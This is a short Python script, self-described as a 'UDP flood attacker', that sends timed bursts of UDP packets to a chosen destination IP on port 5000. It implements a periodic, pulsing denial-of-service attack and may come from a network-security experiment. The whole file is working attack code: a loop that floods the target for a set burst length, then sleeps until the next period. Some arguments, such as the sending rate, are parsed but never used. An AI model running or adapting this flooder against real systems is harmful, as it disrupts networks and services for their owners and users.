#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
import os
import socket
import time
import argparse


def send_burst(sock, target, burst):
    start = time.time()
    payload = '0' * 128

    while time.time() - start < burst:
        sock.sendto(payload, (target, 5000))


def main():
    parser = argparse.ArgumentParser(description='UDP flood attacker.')
    parser.add_argument(
        '--period',
        help=('Period of the attack, T, defined as the number of seconds '
              'between the start of consecutive attack bursts.'),
        type=float,
        required=True)
    parser.add_argument(
        '--burst',
        help='Burst duration in seconds of each flood attack.',
        type=float,
        required=True)
    parser.add_argument(
        '--rate', help='Target sending rate, in Mbps, e.g. 1.5.', default=1.5)
    parser.add_argument(
        '--destination', help='Destination IP address.', required=True)
    args = parser.parse_args()

    data = '0' * 1024
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        start = time.time()
        send_burst(sock, args.destination, args.burst)
        burst_len = time.time() - start
        time.sleep(args.period - burst_len)
    sock.close()


if __name__ == '__main__':
    main()
